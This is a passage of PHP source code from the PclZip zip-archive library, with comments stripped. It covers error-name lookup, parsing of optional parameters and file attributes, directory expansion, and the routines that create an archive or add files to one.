                    PCLZIP_ERR_UNSUPPORTED_ENCRYPTION => 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION'
                    ,PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE => 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE'
                    ,PCLZIP_ERR_DIRECTORY_RESTRICTION => 'PCLZIP_ERR_DIRECTORY_RESTRICTION'
                  );

  if (isset($v_name[$this->error_code])) {
    $v_value = $v_name[$this->error_code];
  }
  else {
    $v_value = 'NoName';
  }

  if ($p_with_code) {
    return($v_value.' ('.$this->error_code.')');
  }
  else {
    return($v_value);
  }
}

function errorInfo($p_full=false)
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    return(PclErrorString());
  }
  else {
    if ($p_full) {
      return($this->errorName(true)." : ".$this->error_string);
    }
    else {
      return($this->error_string." [code ".$this->error_code."]");
    }
  }
}





function privCheckFormat($p_level=0)
{
  $v_result = true;

  clearstatcache();

  $this->privErrorReset();

  if (!is_file($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "Missing archive file '".$this->zipname."'");
    return(false);
  }

  if (!is_readable($this->zipname)) {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to read archive '".$this->zipname."'");
    return(false);
  }




  return $v_result;
}

function privParseOptions(&$p_options_list, $p_size, &$v_result_list, $v_requested_options=false)
{
  $v_result=1;
  
  $i=0;
  while ($i<$p_size) {

    if (!isset($v_requested_options[$p_options_list[$i]])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid optional parameter '".$p_options_list[$i]."' for this method");

      return PclZip::errorCode();
    }

    switch ($p_options_list[$i]) {
      case PCLZIP_OPT_PATH :
      case PCLZIP_OPT_REMOVE_PATH :
      case PCLZIP_OPT_ADD_PATH :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_THRESHOLD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }
        
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_value = $p_options_list[$i+1];
        if ((!is_integer($v_value)) || ($v_value<0)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Integer expected for option '".PclZipUtilOptionText($p_options_list[$i])."'");
          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_value*1048576;
        $i++;
      break;

      case PCLZIP_OPT_TEMP_FILE_ON :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_OFF])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_OFF'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_TEMP_FILE_OFF :
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_ON])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_ON'");
          return PclZip::errorCode();
        }
        if (isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Option '".PclZipUtilOptionText($p_options_list[$i])."' can not be used with option 'PCLZIP_OPT_TEMP_FILE_THRESHOLD'");
          return PclZip::errorCode();
        }
        
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_EXTRACT_DIR_RESTRICTION :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (   is_string($p_options_list[$i+1])
            && ($p_options_list[$i+1] != '')) {
          $v_result_list[$p_options_list[$i]] = PclZipUtilTranslateWinPath($p_options_list[$i+1], FALSE);
          $i++;
        }
        else {
        }
      break;

      case PCLZIP_OPT_BY_NAME :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]][0] = $p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_EREG :
        $p_options_list[$i] = PCLZIP_OPT_BY_PREG;
      case PCLZIP_OPT_BY_PREG :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Wrong parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_COMMENT :
      case PCLZIP_OPT_ADD_COMMENT :
      case PCLZIP_OPT_PREPEND_COMMENT :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE,
		                     "Missing parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }

        if (is_string($p_options_list[$i+1])) {
            $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE,
		                     "Wrong parameter value for option '"
							 .PclZipUtilOptionText($p_options_list[$i])
							 ."'");

          return PclZip::errorCode();
        }
        $i++;
      break;

      case PCLZIP_OPT_BY_INDEX :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_work_list = array();
        if (is_string($p_options_list[$i+1])) {

            $p_options_list[$i+1] = strtr($p_options_list[$i+1], ' ', '');

            $v_work_list = explode(",", $p_options_list[$i+1]);
        }
        else if (is_integer($p_options_list[$i+1])) {
            $v_work_list[0] = $p_options_list[$i+1].'-'.$p_options_list[$i+1];
        }
        else if (is_array($p_options_list[$i+1])) {
            $v_work_list = $p_options_list[$i+1];
        }
        else {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Value must be integer, string or array for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }
        
        $v_sort_flag=false;
        $v_sort_value=0;
        for ($j=0; $j<sizeof($v_work_list); $j++) {
            $v_item_list = explode("-", $v_work_list[$j]);
            $v_size_item_list = sizeof($v_item_list);
            
            
            if ($v_size_item_list == 1) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[0];
            }
            elseif ($v_size_item_list == 2) {
                $v_result_list[$p_options_list[$i]][$j]['start'] = $v_item_list[0];
                $v_result_list[$p_options_list[$i]][$j]['end'] = $v_item_list[1];
            }
            else {
                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Too many values in index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }


            if ($v_result_list[$p_options_list[$i]][$j]['start'] < $v_sort_value) {
                $v_sort_flag=true;

                PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Invalid order of index range for option '".PclZipUtilOptionText($p_options_list[$i])."'");

                return PclZip::errorCode();
            }
            $v_sort_value = $v_result_list[$p_options_list[$i]][$j]['start'];
        }
        
        if ($v_sort_flag) {
        }

        $i++;
      break;

      case PCLZIP_OPT_REMOVE_ALL_PATH :
      case PCLZIP_OPT_EXTRACT_AS_STRING :
      case PCLZIP_OPT_NO_COMPRESSION :
      case PCLZIP_OPT_EXTRACT_IN_OUTPUT :
      case PCLZIP_OPT_REPLACE_NEWER :
      case PCLZIP_OPT_STOP_ON_ERROR :
        $v_result_list[$p_options_list[$i]] = true;
      break;

      case PCLZIP_OPT_SET_CHMOD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $p_options_list[$i+1];
        $i++;
      break;

      case PCLZIP_CB_PRE_EXTRACT :
      case PCLZIP_CB_POST_EXTRACT :
      case PCLZIP_CB_PRE_ADD :
      case PCLZIP_CB_POST_ADD :
        if (($i+1) >= $p_size) {
          PclZip::privErrorLog(PCLZIP_ERR_MISSING_OPTION_VALUE, "Missing parameter value for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_function_name = $p_options_list[$i+1];

        if (!function_exists($v_function_name)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_OPTION_VALUE, "Function '".$v_function_name."()' is not an existing function for option '".PclZipUtilOptionText($p_options_list[$i])."'");

          return PclZip::errorCode();
        }

        $v_result_list[$p_options_list[$i]] = $v_function_name;
        $i++;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Unknown parameter '"
						   .$p_options_list[$i]."'");

        return PclZip::errorCode();
    }

    $i++;
  }

  if ($v_requested_options !== false) {
    for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
      if ($v_requested_options[$key] == 'mandatory') {
        if (!isset($v_result_list[$key])) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");

          return PclZip::errorCode();
        }
      }
    }
  }
  
  if (!isset($v_result_list[PCLZIP_OPT_TEMP_FILE_THRESHOLD])) {
    
  }

  return $v_result;
}

function privOptionDefaultThreshold(&$p_options)
{
  $v_result=1;
  
  if (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
      || isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) {
    return $v_result;
  }
  
  $v_memory_limit = ini_get('memory_limit');
  $v_memory_limit = trim($v_memory_limit);
  $last = strtolower(substr($v_memory_limit, -1));

  if($last == 'g')
      $v_memory_limit = $v_memory_limit*1073741824;
  if($last == 'm')
      $v_memory_limit = $v_memory_limit*1048576;
  if($last == 'k')
      $v_memory_limit = $v_memory_limit*1024;
          
  $p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] = floor($v_memory_limit*PCLZIP_TEMPORARY_FILE_RATIO);
  

  if ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] < 1048576) {
    unset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD]);
  }
        
  return $v_result;
}

function privFileDescrParseAtt(&$p_file_list, &$p_filedescr, $v_options, $v_requested_options=false)
{
  $v_result=1;
  
  foreach ($p_file_list as $v_key => $v_value) {
  
    if (!isset($v_requested_options[$v_key])) {
      PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file attribute '".$v_key."' for this file");

      return PclZip::errorCode();
    }

    switch ($v_key) {
      case PCLZIP_ATT_FILE_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['filename'] = PclZipUtilPathReduction($v_value);
        
        if ($p_filedescr['filename'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

      break;

      case PCLZIP_ATT_FILE_NEW_SHORT_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_short_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_short_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty short filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_NEW_FULL_NAME :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['new_full_name'] = PclZipUtilPathReduction($v_value);

        if ($p_filedescr['new_full_name'] == '') {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid empty full filename for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }
      break;

      case PCLZIP_ATT_FILE_COMMENT :
        if (!is_string($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". String expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['comment'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_MTIME :
        if (!is_integer($v_value)) {
          PclZip::privErrorLog(PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE, "Invalid type ".gettype($v_value).". Integer expected for attribute '".PclZipUtilOptionText($v_key)."'");
          return PclZip::errorCode();
        }

        $p_filedescr['mtime'] = $v_value;
      break;

      case PCLZIP_ATT_FILE_CONTENT :
        $p_filedescr['content'] = $v_value;
      break;

      default :
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                           "Unknown parameter '".$v_key."'");

        return PclZip::errorCode();
    }

    if ($v_requested_options !== false) {
      for ($key=reset($v_requested_options); $key=key($v_requested_options); $key=next($v_requested_options)) {
        if ($v_requested_options[$key] == 'mandatory') {
          if (!isset($p_file_list[$key])) {
            PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Missing mandatory parameter ".PclZipUtilOptionText($key)."(".$key.")");
            return PclZip::errorCode();
          }
        }
      }
    }
  
  }
  
  return $v_result;
}

function privFileDescrExpand(&$p_filedescr_list, &$p_options)
{
  $v_result=1;
  
  $v_result_list = array();
  
  for ($i=0; $i<sizeof($p_filedescr_list); $i++) {
    
    $v_descr = $p_filedescr_list[$i];
    
    $v_descr['filename'] = PclZipUtilTranslateWinPath($v_descr['filename'], false);
    $v_descr['filename'] = PclZipUtilPathReduction($v_descr['filename']);
    
    if (file_exists($v_descr['filename'])) {
      if (@is_file($v_descr['filename'])) {
        $v_descr['type'] = 'file';
      }
      else if (@is_dir($v_descr['filename'])) {
        $v_descr['type'] = 'folder';
      }
      else if (@is_link($v_descr['filename'])) {
        continue;
      }
      else {
        continue;
      }
    }
    
    else if (isset($v_descr['content'])) {
      $v_descr['type'] = 'virtual_file';
    }
    
    else {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$v_descr['filename']."' does not exist");

      return PclZip::errorCode();
    }
    
    $this->privCalculateStoredFilename($v_descr, $p_options);
    
    $v_result_list[sizeof($v_result_list)] = $v_descr;
    
    if ($v_descr['type'] == 'folder') {
      $v_dirlist_descr = array();
      $v_dirlist_nb = 0;
      if ($v_folder_handler = @opendir($v_descr['filename'])) {
        while (($v_item_handler = @readdir($v_folder_handler)) !== false) {

          if (($v_item_handler == '.') || ($v_item_handler == '..')) {
              continue;
          }
          
          $v_dirlist_descr[$v_dirlist_nb]['filename'] = $v_descr['filename'].'/'.$v_item_handler;
          
          if (($v_descr['stored_filename'] != $v_descr['filename'])
               && (!isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))) {
            if ($v_descr['stored_filename'] != '') {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_descr['stored_filename'].'/'.$v_item_handler;
            }
            else {
              $v_dirlist_descr[$v_dirlist_nb]['new_full_name'] = $v_item_handler;
            }
          }
    
          $v_dirlist_nb++;
        }
        
        @closedir($v_folder_handler);
      }
      else {
      }
      
      if ($v_dirlist_nb != 0) {
        if (($v_result = $this->privFileDescrExpand($v_dirlist_descr, $p_options)) != 1) {
          return $v_result;
        }
        
        $v_result_list = array_merge($v_result_list, $v_dirlist_descr);
      }
      else {
      }
        
      unset($v_dirlist_descr);
    }
  }
  
  $p_filedescr_list = $v_result_list;

  return $v_result;
}

function privCreate($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();
  
  $this->privDisableMagicQuotes();

  if (($v_result = $this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  $v_result = $this->privAddList($p_filedescr_list, $p_result_list, $p_options);

  $this->privCloseFd();

  $this->privSwapBackMagicQuotes();

  return $v_result;
}

function privAdd($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if ((!is_file($this->zipname)) || (filesize($this->zipname) == 0))
  {

    $v_result = $this->privCreate($p_filedescr_list, $p_result_list, $p_options);

    return $v_result;
  }
  $this->privDisableMagicQuotes();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $this->privSwapBackMagicQuotes();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    fclose($v_zip_temp_fd);
    $this->privCloseFd();
    @unlink($v_zip_temp_name);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  for ($i=0, $v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        fclose($v_zip_temp_fd);
        $this->privCloseFd();
        @unlink($v_zip_temp_name);
        $this->privSwapBackMagicQuotes();

        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = $v_central_dir['comment'];
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_ADD_COMMENT])) {
    $v_comment = $v_comment.$p_options[PCLZIP_OPT_ADD_COMMENT];
  }
  if (isset($p_options[PCLZIP_OPT_PREPEND_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_PREPEND_COMMENT].$v_comment;
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count+$v_central_dir['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);
    $this->privSwapBackMagicQuotes();

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  $this->privSwapBackMagicQuotes();

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privOpenFd($p_mode)
{
  $v_result=1;

  if ($this->zip_fd != 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Zip file \''.$this->zipname.'\' already open');

    return PclZip::errorCode();
  }

  if (($this->zip_fd = @fopen($this->zipname, $p_mode)) == 0)
  {
    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive \''.$this->zipname.'\' in '.$p_mode.' mode');

    return PclZip::errorCode();
  }

  return $v_result;
}

function privCloseFd()
{
  $v_result=1;

  if ($this->zip_fd != 0)
    @fclose($this->zip_fd);
  $this->zip_fd = 0;

  return $v_result;
}

function privAddList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;

  $v_header_list = array();
  if (($v_result = $this->privAddFileList($p_filedescr_list, $v_header_list, $p_options)) != 1)
  {
    return $v_result;
  }

  $v_offset = @ftell($this->zip_fd);

  for ($i=0,$v_count=0; $i<sizeof($v_header_list); $i++)
  {
    if ($v_header_list[$i]['status'] == 'ok') {
      if (($v_result = $this->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
        return $v_result;
      }
      $v_count++;
    }

    $this->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
  }

  $v_comment = '';
  if (isset($p_options[PCLZIP_OPT_COMMENT])) {
    $v_comment = $p_options[PCLZIP_OPT_COMMENT];
  }

  $v_size = @ftell($this->zip_fd)-$v_offset;

  if (($v_result = $this->privWriteCentralHeader($v_count, $v_size, $v_offset, $v_comment)) != 1)
  {
    unset($v_header_list);

    return $v_result;
  }

  return $v_result;
}

function privAddFileList($p_filedescr_list, &$p_result_list, &$p_options)
{
  $v_result=1;
  $v_header = array();

  $v_nb = sizeof($p_result_list);

  for ($j=0; ($j<sizeof($p_filedescr_list)) && ($v_result==1); $j++) {
    $p_filedescr_list[$j]['filename']
    = PclZipUtilTranslateWinPath($p_filedescr_list[$j]['filename'], false);
    

    if ($p_filedescr_list[$j]['filename'] == "") {
      continue;
    }

    if (   ($p_filedescr_list[$j]['type'] != 'virtual_file')
        && (!file_exists($p_filedescr_list[$j]['filename']))) {
      PclZip::privErrorLog(PCLZIP_ERR_MISSING_FILE, "File '".$p_filedescr_list[$j]['filename']."' does not exist");
      return PclZip::errorCode();
    }

    if (   ($p_filedescr_list[$j]['type'] == 'file')
        || ($p_filedescr_list[$j]['type'] == 'virtual_file')
        || (   ($p_filedescr_list[$j]['type'] == 'folder')
            && (   !isset($p_options[PCLZIP_OPT_REMOVE_ALL_PATH])
                || !$p_options[PCLZIP_OPT_REMOVE_ALL_PATH]))
        ) {

      $v_result = $this->privAddFile($p_filedescr_list[$j], $v_header,
                                     $p_options);
      if ($v_result != 1) {
        return $v_result;
      }

      $p_result_list[$v_nb++] = $v_header;
    }
  }

  return $v_result;
}

function privAddFile($p_filedescr, &$p_header, &$p_options)
{
  $v_result=1;
  
  $p_filename = $p_filedescr['filename'];

  if ($p_filename == "") {
    PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER, "Invalid file list parameter (invalid or empty list)");

    return PclZip::errorCode();
  }


  clearstatcache();
  $p_header['version'] = 20;
  $p_header['version_extracted'] = 10;
  $p_header['flag'] = 0;
  $p_header['compression'] = 0;
  $p_header['crc'] = 0;
  $p_header['compressed_size'] = 0;
  $p_header['filename_len'] = strlen($p_filename);
  $p_header['extra_len'] = 0;
  $p_header['disk'] = 0;
  $p_header['internal'] = 0;
  $p_header['offset'] = 0;
  $p_header['filename'] = $p_filename;
  $p_header['stored_filename'] = $p_filedescr['stored_filename'];
  $p_header['extra'] = '';
  $p_header['status'] = 'ok';
  $p_header['index'] = -1;

  if ($p_filedescr['type']=='file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type']=='folder') {
    $p_header['external'] = 0x00000010;
    $p_header['mtime'] = filemtime($p_filename);
    $p_header['size'] = filesize($p_filename);
  }
  
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['external'] = 0x00000000;
    $p_header['size'] = strlen($p_filedescr['content']);
  }
  

  if (isset($p_filedescr['mtime'])) {
    $p_header['mtime'] = $p_filedescr['mtime'];
  }
  else if ($p_filedescr['type'] == 'virtual_file') {
    $p_header['mtime'] = time();
  }
  else {
    $p_header['mtime'] = filemtime($p_filename);
  }

  if (isset($p_filedescr['comment'])) {
    $p_header['comment_len'] = strlen($p_filedescr['comment']);
    $p_header['comment'] = $p_filedescr['comment'];
  }
  else {
    $p_header['comment_len'] = 0;
    $p_header['comment'] = '';
  }

  if (isset($p_options[PCLZIP_CB_PRE_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_PRE_ADD](PCLZIP_CB_PRE_ADD, $v_local_header);
    if ($v_result == 0) {
      $p_header['status'] = "skipped";
      $v_result = 1;
    }

    if ($p_header['stored_filename'] != $v_local_header['stored_filename']) {
      $p_header['stored_filename'] = PclZipUtilPathReduction($v_local_header['stored_filename']);
    }
  }

  if ($p_header['stored_filename'] == "") {
    $p_header['status'] = "filtered";
  }
  
  if (strlen($p_header['stored_filename']) > 0xFF) {
    $p_header['status'] = 'filename_too_long';
  }

  if ($p_header['status'] == 'ok') {

    if ($p_filedescr['type'] == 'file') {
      if ( (!isset($p_options[PCLZIP_OPT_TEMP_FILE_OFF])) 
          && (isset($p_options[PCLZIP_OPT_TEMP_FILE_ON])
              || (isset($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD])
                  && ($p_options[PCLZIP_OPT_TEMP_FILE_THRESHOLD] <= $p_header['size'])) ) ) {
        $v_result = $this->privAddFileUsingTempFile($p_filedescr, $p_header, $p_options);
        if ($v_result < PCLZIP_ERR_NO_ERROR) {
          return $v_result;
        }
      }
      
      else {

      if (($v_file = @fopen($p_filename, "rb")) == 0) {
        PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, "Unable to open file '$p_filename' in binary read mode");
        return PclZip::errorCode();
      }

      $v_content = @fread($v_file, $p_header['size']);

      @fclose($v_file);

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);

      }

    }

    else if ($p_filedescr['type'] == 'virtual_file') {
        
      $v_content = $p_filedescr['content'];

      $p_header['crc'] = @crc32($v_content);
      
      if ($p_options[PCLZIP_OPT_NO_COMPRESSION]) {
        $p_header['compressed_size'] = $p_header['size'];
        $p_header['compression'] = 0;
      }
      
      else {
        $v_content = @gzdeflate($v_content);

        $p_header['compressed_size'] = strlen($v_content);
        $p_header['compression'] = 8;
      }
      
      if (($v_result = $this->privWriteFileHeader($p_header)) != 1) {
        @fclose($v_file);
        return $v_result;
      }

      @fwrite($this->zip_fd, $v_content, $p_header['compressed_size']);
    }

    else if ($p_filedescr['type'] == 'folder') {
      if (@substr($p_header['stored_filename'], -1) != '/') {
        $p_header['stored_filename'] .= '/';
      }

      $p_header['size'] = 0;

      if (($v_result = $this->privWriteFileHeader($p_header)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (isset($p_options[PCLZIP_CB_POST_ADD])) {

    $v_local_header = array();
    $this->privConvertHeader2FileInfo($p_header, $v_local_header);

    $v_result = $p_options[PCLZIP_CB_POST_ADD](PCLZIP_CB_POST_ADD, $v_local_header);
    if ($v_result == 0) {
      $v_result = 1;
    }

  }

